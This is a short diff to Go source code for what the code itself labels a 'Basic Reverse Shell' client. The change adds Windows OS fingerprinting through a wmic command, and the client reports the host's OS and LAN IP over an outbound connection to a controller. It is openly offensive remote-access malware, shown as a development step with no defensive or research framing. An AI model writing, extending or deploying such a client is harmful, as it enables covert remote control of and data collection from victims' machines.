@@ -6,6 +6,7 @@ import (
 	"net"
 	"os/exec"
 	"runtime"
+	"strings"
 )
 
 var HOST_IP string = GetOutboundIP() //"192.168.3.6"
@@ -31,8 +32,14 @@ func GetPort() string {
 	// TODO: add OS flavor
 	if runtime.GOOS == "linux" {
 		osFlavor = getOS()
+	} else if runtime.GOOS == "windows" {
+		cmd := exec.Command("wmic", "os", "get", "Caption")
+		out, _ := cmd.Output()
+		osFlavor = string(out)
+		osFlavor = osFlavor[strings.Index(osFlavor, "\n")+1:]
+		osFlavor = trim(osFlavor[:strings.Index(osFlavor, "\n")])
+		cmd.Run()
 	}
-	fmt.Println(runtime.GOOS)
 	it, err := getPort.Write([]byte(
 		"INFO:{clientType:Basic Reverse Shell," +
 			"lanIP:" + GetOutboundIP() + "," +
